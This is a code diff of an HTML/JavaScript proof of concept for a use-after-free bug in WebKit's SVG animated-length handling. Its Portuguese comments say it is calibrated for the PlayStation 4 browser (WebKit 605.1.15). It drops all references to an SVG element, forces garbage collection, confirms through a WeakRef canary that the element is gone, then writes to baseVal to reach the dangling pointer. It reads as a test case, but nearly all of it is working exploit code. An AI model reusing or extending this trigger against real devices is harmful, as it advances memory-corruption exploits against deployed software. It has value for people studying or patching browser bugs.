@@ -1,46 +1,36 @@
+<script src="resources/gc.js"></script>
 <script>
-function gc() {
-    // Alocações grandes para forçar coleta no heap do JSC
-    for (let i = 0; i < 100; i++) {
-        new ArrayBuffer(1024 * 1024); // 1 MB sem referência → imediatamente coletável
-    }
-    // Pressão adicional via objetos JS
-    let arr = [];
-    for (let i = 0; i < 5000; i++) {
-        arr.push({ x: new ArrayBuffer(1024) });
-    }
-    arr = null;
-}
-
 onload = async () => {
     let svg0 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
     let svgAnimatedLength = svg0.width;
-    // svgAnimatedLength → RefPtr → SVGAnimatedLength
-    // SVGAnimatedLength.m_contextElement → raw ptr → SVGSVGElement (sem refcount!)
     let baseVal = svgAnimatedLength.baseVal;
-    // baseVal → mantém SVGAnimatedLength vivo, mas NÃO segura o SVGSVGElement
     let clipPath0 = document.createElementNS('http://www.w3.org/2000/svg', 'clipPath');
     svg0.append(clipPath0);
     clipPath0.append('');
+    await undefined;
 
-    await undefined; // Cede ao event loop; cria ponto de yield na função async
+    // Canário antes de nular
+    let canary = new WeakRef(svg0);
 
-    // CRÍTICO: liberar explicitamente as referências JS antes do GC.
-    // Sem isso, o JSC não tem como saber que svg0 é dead (especialmente no
-    // tier interpretado/baseline do WebKit 605.1.15 do PS4).
-    // Ao anular svg0, o wrapper JS fica inacessível → GC pode destruir o
-    // SVGSVGElement → m_contextElement em SVGAnimatedProperty fica dangling.
     svg0 = null;
     svgAnimatedLength = null;
     clipPath0 = null;
 
-    gc(); // Agora sim o GC pode coletar o wrapper de svg0 e destruir SVGSVGElement
+    // GC calibrado pro PS4
+    await gc(); // ou o export do seu force-gc-ps4.js
 
-    // baseVal ainda aponta para SVGAnimatedLength (vivo via RefPtr),
-    // mas SVGAnimatedLength.m_contextElement → raw ptr → memória liberada
-    // → commitPropertyChange() → UAF
-    baseVal.value = 0;
+    // Diagnóstico: svg0 foi coletado?
+    if (canary.deref() !== undefined) {
+        document.body.innerHTML =
+            'FALHOU: svg0 NÃO foi coletado — m_contextElement ainda válido, UAF impossível.<br>' +
+            'Causa: referência adicional mantendo SVGSVGElement vivo.';
+        return;
+    }
 
+    // svg0 coletado → m_contextElement é raw pointer dangling
+    // baseVal ainda mantém SVGAnimatedLength vivo via RefPtr
+    document.body.innerHTML = 'svg0 coletado. Disparando UAF...';
+    baseVal.value = 0; // commitPropertyChange → m_contextElement->... → UAF
     document.body.innerHTML = 'PASS if no crash';
 };
 </script>
